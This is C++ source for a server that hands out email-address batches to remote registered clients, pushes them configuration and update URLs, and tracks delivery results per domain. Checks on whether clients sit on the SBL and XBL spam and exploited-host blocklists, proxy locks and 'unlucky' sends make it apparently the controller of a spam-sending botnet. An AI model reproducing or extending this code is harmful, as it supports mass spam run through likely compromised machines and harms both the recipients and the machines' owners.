#include <algorithm>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>

#include <Client.h>
#include <Mailer.h>
#include <ServerConfig.h>
#include <Logger.h>
#include <version.h>
#include <param.h>

//#define PROTODEBUG

Client::Client(ClientThread &cth, int sock, const sockaddr_in &addr)
: socket(sock)
, state(STATE_WRITING_RESPONSE)
, clientState(CLIENT_STATE_PREHELO)
, registered(false)
, timeConnected(util::microtime())
, version(0)
, configTimestamp(0)
, pos(0)
, emailsInBuf(0)
, logFile(PARAM_LOG_DIR "/UNKNOWN")
, myThread(cth)
, nextOnWhiteList(whiteList.begin())
{
g_mailer.getStatThread().clientObjects++;
	lastRead = time(NULL);

	strcpy(idString, "<unknown>");

	buf.header.msg = RESP_HELO;
	buf.header.size = sizeof(MsgHeader) + sizeof(HeloResp);
	buf.heloResp.version = (g_verMajor<<16) + (g_verMinor<<8) + g_verRelease;
	buf.heloResp.ip = addr.sin_addr;
	g_mailer.getStatThread().connects++;
	g_mailer.getStatThread().heloResps++;

	myThread.getPoller().add(socket, this, POLLIN | POLLOUT);
}

Client::~Client()
{
g_mailer.getStatThread().clientObjects--;
}

void Client::checkDead(time_t tnow)
{
	if((tnow-lastRead) > static_cast<time_t>(g_config->deadInterval)) {
		g_log.logf(LOG_WARNING, "Client %s seems dead.\n", idString);
		close(0, "checkDead [dead]");
	}
}

int Client::notifyPollEvent(Poller::PollEvent *e, time_t tnow)
{
	if(e->revents & POLLIN) {
		lastRead = tnow;
	}

	switch(state) {
	case STATE_READING_HEADER:
		if(e->revents & POLLIN) {
			readHeader();
		}
		break;
	case STATE_READING_BODY:
		if(e->revents & POLLIN) {
			readBody();
		}
		break;
	case STATE_READING_MSG_LOG:
		if(e->revents & POLLIN) {
			readMsgLog();
		}
		break;
	case STATE_WRITING_RESPONSE:
		if(e->revents & POLLOUT) {
			writeResponse();
		}
		break;
	case STATE_WRITING_CONFIG:
		if(e->revents & POLLOUT) {
			writeConfig();
		}
		break;
	default:
		g_log.logf(LOG_FATAL, "Client::notifyPollEvent: bad state %d\n", state);
		abort();
	}

	switch(state) {
	case STATE_READING_HEADER:
	case STATE_READING_BODY:
	case STATE_READING_MSG_LOG:
		myThread.getPoller().andMask(socket, POLLIN);
		break;
	case STATE_WRITING_RESPONSE:
	case STATE_WRITING_CONFIG:
		myThread.getPoller().orMask(socket, POLLIN | POLLOUT);
		break;
	default:
		g_log.logf(LOG_FATAL, "Client::notifyPollEvent: bad state %d\n", state);
		abort();
	}

	return 0;
}

void Client::close(int err, const char *where)
{
	FILE *fp;
	char message[512];

	if(socket == -1) {
		g_log.logf(LOG_ERROR,
			"Client %s ver %x already disconnected\n",
			idString, version);
		return;
	}

	if(registered) {
		g_mailer.unregisterClient(idString);
	}

	if(err != 0) {
		snprintf(message, sizeof(message),
			"Client %s ver %x disconnected: %s (connect time %.2fs, at %s)\n",
			idString, version, strerror(err),
			(util::microtime()-timeConnected)/1000000.0f, where);
	} else {
		snprintf(message, sizeof(message),
			"Client %s ver %x disconnected (connect time %.2fs, at %s)\n",
			idString, version, (util::microtime()-timeConnected)/1000000.0,
			where);
	}

	if(g_config->saveClientLogs) {
		fp = fopen(logFile.c_str(), "at");
		if(fp != NULL) {
			char buf[27];
			time_t t = time(NULL);

			ctime_r(&t, buf);
			fprintf(fp, "\n*** %s%s", buf, message);
			fclose(fp);
		} else {
			g_log.logf(LOG_WARNING, "Client %s: cannot open log file\n", idString);
		}
	}

	g_log.logf(LOG_INFO, "%s", message);
	g_log.logf(LOG_TRACE, "Client %s state:%d cstate:%d\n",
		idString, state, clientState);

	myThread.getPoller().del(socket);
	
	::close(socket);
	socket = -1;
	myThread.removeClient(myToken);
	g_mailer.getStatThread().lostEmails += emailsInBuf;
	g_mailer.getStatThread().disconnects++;
}

void Client::readHeader()
{
	int n;
	
	n = recv(socket, &buf.c[pos], sizeof(MsgHeader) - pos, 0);
	if(n > 0) {
		pos += n;
		if(pos == sizeof(MsgHeader)) {
			switch(buf.header.msg) {
			case MSG_HELO:
			case MSG_DONE:
				if(buf.header.size > BUFSIZE) {
					g_log.logf(LOG_ERROR, "Client %s: message %d too long (%d bytes)\n",
						idString, buf.header.msg, buf.header.size);
					close(0, "readHeader [message to long]");
					return;
				}
				state = STATE_READING_BODY;
				readBody();
				break;
			case MSG_PING:
				onPingMsg();
				break;
			case MSG_READY:
				onReadyMsg();
				break;
			case MSG_LOG:
				state = STATE_READING_MSG_LOG;
				readMsgLog();
				break;
			case MSG_GETFDOMAINS:
				onGetFromDomainsMsg();
				break;
			default:
				g_log.logf(LOG_ERROR, "Client %s: bad message %d size %d bytes\n",
					idString, buf.header.msg, buf.header.size);
				close(0, "readHeader [bad message]");
				break;
			}
		}
	} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
		close(n==0 ? 0 : errno, "readHeader");
	}
}

void Client::readBody()
{
	int n;
	
	n = recv(socket, &buf.c[pos], buf.header.size - pos, 0);
	if(n > 0) {
		pos += n;
		if(pos == buf.header.size) {
			switch(buf.header.msg) {
			case MSG_HELO:
				onHeloMsg();
				break;
			case MSG_DONE:
				onDoneMsg();
				break;
			default:
				g_log.logf(LOG_ERROR, "Client %s: bad message %d size %d bytes\n",
					idString, buf.header.msg, buf.header.size);
				close(0, "readBody [bad message]");
				break;
			}
		}
	} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
		close(n==0 ? 0 : errno, "readBody");
	}
}

void Client::readMsgLog()
{
	int n;
	
#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< LOG[%s]: %d\n", idString, buf.header.size);
#endif

	if(clientState != CLIENT_STATE_IDLE
		&& clientState != CLIENT_STATE_WORKING)
	{
		close(0, "readMsgLog [bad cstate]");
		return;
	}
	
	do {
		n = std::min(static_cast<unsigned int>(BUFSIZE),
			buf.header.size) - sizeof(MsgHeader);
		n = recv(socket, buf.body, n, 0);
		if(n > 0) {
			if(g_config->saveClientLogs) {
				FILE *fp = fopen(logFile.c_str(), "at");

				if(fp != NULL) {
					fwrite(buf.body, n, 1, fp);
					fclose(fp);
				} else {
					g_log.logf(LOG_WARNING,
						"Client %s: cannot open log file \"%s\"\n",
						idString, logFile.c_str());
				}
			}

			buf.header.size -= n;
		} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
			close(n==0 ? 0 : errno, "readMsgLog");
			state = STATE_READING_HEADER;
			pos = 0;
			break;
		} else {
			return;
		}
	} while(buf.header.size != sizeof(MsgHeader));

	state = STATE_READING_HEADER;
	pos = 0;
}

void Client::writeResponse()
{
	int n;
	
	n = send(socket, &buf.c[pos], buf.header.size - pos, 0);
	if(n > 0) {
		pos += n;
		if(pos == buf.header.size) {
			if(clientState == CLIENT_STATE_QUITTING) {
				close(0, "writeResponse [quit]");
			}
			state = STATE_READING_HEADER;
			pos = 0;
		}
	} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
		close(n==0 ? 0 : errno, "writeResponse");
	}
}

void Client::writeConfig()
{
	int n;

	if(pos < sizeof(MsgHeader)) {
		n = send(socket, &buf.c[pos], sizeof(MsgHeader) - pos, 0);
		if(n > 0) {
			pos += n;
			if(pos == sizeof(MsgHeader)) {
				writeConfigProper();
			}
		} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
			close(n==0 ? 0 : errno, "writeConfig");
		}
	} else {
		writeConfigProper();
	}
}

void Client::writeConfigProper()
{
	int n;

	n = send(socket, &config->ptr[pos - sizeof(MsgHeader)],
		config->size - (pos-sizeof(MsgHeader)), 0);
	if(n > 0) {
		pos += n;
		if(pos == config->size+sizeof(MsgHeader)) {
			state = STATE_READING_HEADER;
			pos = 0;
		}
	} else if(n==0 || (n==-1 && errno!=EAGAIN)) {
		close(n==0 ? 0 : errno, "writeConfigProper");
	}
}

void Client::onHeloMsg()
{
	FILE *fp;

#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< HELO: ver:%x pver:%x id:'%-.16s'\n",
		buf.heloMsg.version,
		buf.heloMsg.protover,
		buf.heloMsg.id);
#endif

	if(clientState != CLIENT_STATE_PREHELO) {
		close(0, "onHeloMsg [bad cstate]");
		return;
	}

	version = buf.heloMsg.version;
	memcpy(idString, buf.heloMsg.id, 16);
	idString[16] = '\0';

	for(int i = 0; i < 16; i++) {
		if(!isxdigit(idString[i])) {
			idString[i] = '_';
		}
	}

	if(!g_mailer.registerClient(idString)) {
		g_log.logf(LOG_INFO, "Duplicate client %s\n", idString);

		buf.header.msg = RESP_QUIT;
		buf.header.size = sizeof(MsgHeader) + sizeof(QuitResp);
		buf.quitResp.seconds = static_cast<unsigned int>(-1);
		g_mailer.getStatThread().quitResps++;

		clientState = CLIENT_STATE_QUITTING;

		state = STATE_WRITING_RESPONSE;
		pos = 0;
		writeResponse();

		return;
	}

	registered = true;
	
	if(g_config->saveClientLogs) {
		logFile = PARAM_LOG_DIR;
		logFile += '/';
		logFile += idString[0];
		logFile += idString[1];

		if(mkdir(logFile.c_str(), 0755)!=0 && errno!=EEXIST) {
			g_log.logf(LOG_WARNING, "Cannot create log directory \"%s\"\n", logFile.c_str());
		}

		logFile += '/';
		logFile += idString;

		fp = fopen(logFile.c_str(), "wt");
		if(fp != NULL) {
			char x[26];
			time_t t = static_cast<time_t>(timeConnected / 1000000);

			ctime_r(&t, x);
			x[24] = '\0';
			fprintf(fp, "*** Connected on %s, flags %08x\n", x, buf.heloMsg.flags);
			fclose(fp);
		} else {
			g_log.logf(LOG_WARNING, "Client %s: cannot create log file\n", idString);
		}
	}

	if(((buf.heloMsg.version&0xffff) != g_config->clientConfigVer)
		|| (buf.heloMsg.protover != PARAM_PROTOCOL_VER))
	{
		buf.header.msg = RESP_UPDATE;
		buf.header.size = sizeof(MsgHeader) + g_config->updateUrl.length();
		strcpy(buf.updateResp.url, g_config->updateUrl.c_str());
		g_mailer.getStatThread().updateResps++;

		clientState = CLIENT_STATE_QUITTING;
		
		g_log.logf(LOG_INFO, "Updating client %s ver %x\n", idString, version);
	} else if((!(buf.heloMsg.flags & CLIENT_CAN_MAIL) && !g_config->useProxyLock)
		|| (!(buf.heloMsg.flags & CLIENT_HAS_PROXY_LOCK) && g_config->useProxyLock)
		|| ((buf.heloMsg.flags & CLIENT_SBL_LISTED) && !g_config->allowSblListed)
		|| ((buf.heloMsg.flags & CLIENT_XBL_LISTED) && !g_config->allowXblListed))
	{
		buf.header.msg = RESP_QUIT;
		buf.header.size = sizeof(MsgHeader) + sizeof(QuitResp);
		buf.quitResp.seconds = 3 * 3600;
		g_mailer.getStatThread().quitResps++;

		clientState = CLIENT_STATE_QUITTING;
		
		g_log.logf(LOG_INFO, "Unusable client %s\n", idString);
	} else {
		g_log.logf(LOG_INFO, "Client %s: connected, sending config %d\n", idString,
			static_cast<int>(configTimestamp));

		g_mailer.getJobConfig().getData(config, configTimestamp);

		buf.header.msg = RESP_CONFIG;
		buf.header.size = sizeof(MsgHeader) + config->size;
		g_mailer.getStatThread().configResps++;

		clientState = CLIENT_STATE_IDLE;

		state = STATE_WRITING_CONFIG;
		pos = 0;
		writeConfig();
		return;
	}

	state = STATE_WRITING_RESPONSE;
	pos = 0;
	writeResponse();
}

void Client::onPingMsg()
{
#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< PING[%s]\n", idString);
#endif

	if(clientState != CLIENT_STATE_IDLE
		&& clientState != CLIENT_STATE_WORKING)
	{
		close(0, "onPingMsg [bad cstate]");
		return;
	}

	buf.header.msg = RESP_PONG;
	buf.header.size = sizeof(MsgHeader);
	g_mailer.getStatThread().pongResps++;
	state = STATE_WRITING_RESPONSE;
	pos = 0;
	writeResponse();
}

void Client::onReadyMsg()
{
	bool hasEmailsToSend = false;

#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< READY[%s]\n", idString);
#endif

	if(clientState != CLIENT_STATE_IDLE
		&& clientState != CLIENT_STATE_WORKING)
	{
		close(0, "onReadyMsg [bad cstate]");
		return;
	}

	if(g_mailer.getJobConfig().getData(config, configTimestamp)) {
		g_log.logf(LOG_INFO, "Client %s: sending config %d\n", idString,
			static_cast<int>(configTimestamp));
		buf.header.msg = RESP_CONFIG;
		buf.header.size = sizeof(MsgHeader) + config->size;
		g_mailer.getStatThread().configResps++;
		state = STATE_WRITING_CONFIG;
		pos = 0;
		writeConfig();
		return;
	}
	
	if(!g_config->disableTesting) {
		hasEmailsToSend = getWorkBuffer();
	}

	if(!hasEmailsToSend) {
		hasEmailsToSend = getWorkBufferNoTesting();
	}

	if(!hasEmailsToSend) {
		buf.header.msg = RESP_IDLE;
		buf.header.size = sizeof(MsgHeader) + sizeof(IdleResp);
		buf.idleResp.seconds = 60;
		g_mailer.getStatThread().idleResps++;

		clientState = CLIENT_STATE_IDLE;
	}

	state = STATE_WRITING_RESPONSE;
	pos = 0;
	writeResponse();
}

void Client::onDoneMsg()
{
	QueueList::iterator wit, tit;
	int totSent = 0, totFailed = 0, totUnlucky = 0;
	int tstSent = 0, tstFailed = 0, tstWasted = 0;
	int domSent = 0, domFailed = 0, domUnlucky = 0;
	int nemails = 0;
	unsigned char status, len, domlen;
	char *pend, *p, *domp = NULL;
	
#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< DONE[%s]: %d\n", idString, buf.header.size);
#endif

	if(clientState != CLIENT_STATE_IDLE
		&& clientState != CLIENT_STATE_WORKING) {
		close(0, "onDoneMsg [bad cstate]");
		return;
	}

	p = buf.c + sizeof(MsgHeader);
	pend = buf.c + buf.header.size;

	while(p+1 < pend) {
		status = *p++;
		len = *p++;
		if(p+len > pend) {
			break;
		}

		if(status == 0xff) {
			// account for the just processed domain, if any
			if(domp != NULL) {
				if(tit != testList.end()) {
					// was testing
					tstSent += domSent;
					tstFailed += domFailed;
					tstWasted += domUnlucky;

					if(domSent < domUnlucky) {
						blackList.splice(blackList.begin(),
							testList, tit);
					} else if(domSent > 0) {
						whiteList.splice(whiteList.begin(),
							testList, tit);
					} else {
						testList.erase(tit);
					}
				} else {
					totSent += domSent;
					totFailed += domFailed;
					totUnlucky += domUnlucky;

					if(wit != whiteList.end()) {
						if(domSent < domUnlucky) {
							if(wit == nextOnWhiteList) {
								++nextOnWhiteList;
							}

							blackList.splice(blackList.begin(),
								whiteList, wit);
						}
					}
				}
			}

			// now the new domain
			domp = p;
			domlen = len;

			domSent = 0;
			domFailed = 0;
			domUnlucky = 0;

			for(wit = whiteList.begin(); wit != whiteList.end(); ++wit) {
				if(wit->isDomainEqualTo(domp, domlen)) {
					break;
				}
			}

			for(tit = testList.begin(); tit != testList.end(); ++tit) {
				if(tit->isDomainEqualTo(domp, domlen)) {
					break;
				}
			}

			if(wit!=whiteList.end() && tit!=testList.end()) {
				close(0, "onDoneMsg [domain on both lists]");
				return;
			}

//			if(wit==whiteList.end() && tit==testList.end()) {
//				close(0, "onDoneMsg [domain on neither list]");
//				return;
//			}
		} else {
			if(domp == NULL) {
				close(0, "onDoneMsg [null domain]");
				return;
			}

			switch(status) {
			case STATUS_UNLUCKY:
			case STATUS_CANNOTCONNECT:
				++domUnlucky;
				g_mailer.putUnluckyEmail(p, len, domp, domlen);
				break;
			case STATUS_FAILED:
			case STATUS_NOMX:
				++domFailed;
				g_mailer.putFailedEmail(p, len, domp, domlen);
				break;
			case STATUS_SENT:
				++domSent;
				g_mailer.putSentEmail(p, len, domp, domlen);
				break;
			default:
				close(0, "onDoneMsg [bad test result]");
				return;
			}

			++nemails;
		}
		p += len;
	}

	if(domp != NULL) {
		if(tit != testList.end()) {
			// was testing
			tstSent += domSent;
			tstFailed += domFailed;
			tstWasted += domUnlucky;

			if(domSent < domUnlucky) {
				blackList.splice(blackList.begin(),
					testList, tit);
			} else if(domSent > 0) {
				whiteList.splice(whiteList.begin(),
					testList, tit);
			} else {
				testList.erase(tit);
			}
		} else {
			totSent += domSent;
			totFailed += domFailed;
			totUnlucky += domUnlucky;

			if(wit != whiteList.end()) {
				if(domSent < domUnlucky) {
					if(wit == nextOnWhiteList) {
						++nextOnWhiteList;
					}

					blackList.splice(blackList.begin(),
						whiteList, wit);
				}
			}
		}
	}

	emailsInBuf -= nemails;

//	if(!testList.empty()) {
//		close(0, "onDoneMsg [some domains left]");
//		return;
//	}

	// XXX make this one function
	g_mailer.getStatThread().sentEmails       += totSent + tstSent;
	g_mailer.getStatThread().failedEmails     += totFailed + tstFailed;
	g_mailer.getStatThread().unluckyEmails    += totUnlucky;
	g_mailer.getStatThread().sentTestEmails   += tstSent;
	g_mailer.getStatThread().failedTestEmails += tstFailed;
	g_mailer.getStatThread().wastedTestEmails += tstWasted;

	state = STATE_READING_HEADER;
	pos = 0;
}

void Client::onGetFromDomainsMsg()
{
#ifdef PROTODEBUG
	g_log.logf(LOG_TRACE, "< GETFDOMAINS[%s]\n", idString);
#endif

	if(clientState != CLIENT_STATE_IDLE
		&& clientState != CLIENT_STATE_WORKING)
	{
		close(0, "onPingMsg [bad cstate]");
		return;
	}

	buf.header.msg = RESP_PUTFDOMAINS;
	buf.header.size = sizeof(MsgHeader) + g_mailer.getFromDomains( buf.body,
		sizeof(buf) - sizeof(MsgHeader), g_config->fromDomainsPerRequest);
	g_mailer.getStatThread().domainResps++;

	state = STATE_WRITING_RESPONSE;
	pos = 0;
	writeResponse();
}

bool Client::getWorkBuffer()
{
	QueueList::iterator it;
	size_t sz, totsz = sizeof(MsgHeader);
	int ne, totne = 0;

//	assert(testList.empty());

	while(nextOnWhiteList!=whiteList.end() && nextOnWhiteList->done()) {
		++nextOnWhiteList;
	}
		
	// it's ok if *nextOnWhiteList==whiteList.end() cause we'll be only comparing pointers
	whiteList.remove_if(EmailQueue::queueDoneProtected(*nextOnWhiteList));
	blackList.remove_if(EmailQueue::queueDone);

	if(whiteList.size() < g_config->minMailableDomains) {
		QueueList newTestList;

		g_mailer.getTestQueues(blackList, whiteList, testList, newTestList, g_config->maxTestDomains);

		for(it = newTestList.begin(); it != newTestList.end(); ++it) {
			sz = sizeof(buf) - totsz;
			ne = it->getEmails(buf.c + totsz, g_config->emailsPerTestDomain, sz);
			if(ne > 0) {
				totne += ne;
				totsz += sz;
			} else {
				if(it->getState() == EmailQueue::STATE_NORMAL) {
					break;
				} else if(it->getState() == EmailQueue::STATE_FINISHED) {
					newTestList.erase(it--);
				}
			}
		}

		newTestList.erase(it, newTestList.end());
		testList.splice(testList.end(), newTestList);

		g_mailer.getStatThread().testOut += totne;
	}

	if(!whiteList.empty()) {
		QueueList::iterator endIt = nextOnWhiteList;
		int prevtotne = totne;

		if(endIt == whiteList.end()) {
			endIt = whiteList.begin();
		}

		if(nextOnWhiteList==whiteList.end() || ++nextOnWhiteList==whiteList.end()) {
			nextOnWhiteList = whiteList.begin();
		}

		do {
			sz = sizeof(buf) - totsz;
			ne = nextOnWhiteList->getEmails(buf.c + totsz, g_config->emailsPerMailableDomain, sz);
			if(ne > 0) {
				totne += ne;
				totsz += sz;
			} else {
				if(nextOnWhiteList->getState() == EmailQueue::STATE_NORMAL) {
					break;
				}
			}

			if(++nextOnWhiteList == whiteList.end()) {
				nextOnWhiteList = whiteList.begin();
			}
		} while(nextOnWhiteList != endIt);

		g_mailer.getStatThread().whiteOut += totne - prevtotne;
	}

	if(totne == 0) {
		return false;
	}

	buf.header.msg = RESP_EMAILS;
	buf.header.size = totsz;
	emailsInBuf += totne;
	g_mailer.getStatThread().testResps++;

	clientState = CLIENT_STATE_WORKING;

	return true;
}

bool Client::getWorkBufferNoTesting()
{
	static QueueList nullList;
	QueueList list;
	QueueList::iterator it;
	size_t sz, totsz = sizeof(MsgHeader);
	int ne, totne = 0;

	g_mailer.getTestQueues(nullList, nullList, nullList, list, 10);

	for(it = list.begin(); it != list.end(); ++it) {
		sz = sizeof(buf) - totsz;
		ne = it->getEmails(buf.c + totsz, g_config->emailsPerMailableDomain, sz);
		if(ne > 0) {
			totne += ne;
			totsz += sz;
		} else {
			if(it->getState() == EmailQueue::STATE_NORMAL) {
				break;
			}
		}
	}

	if(totne == 0) {
		return false;
	}

	buf.header.msg = RESP_EMAILS;
	buf.header.size = totsz;
	emailsInBuf += totne;
	g_mailer.getStatThread().blindOut += totne;
	g_mailer.getStatThread().blindResps++;

	clientState = CLIENT_STATE_WORKING;

	return true;
}
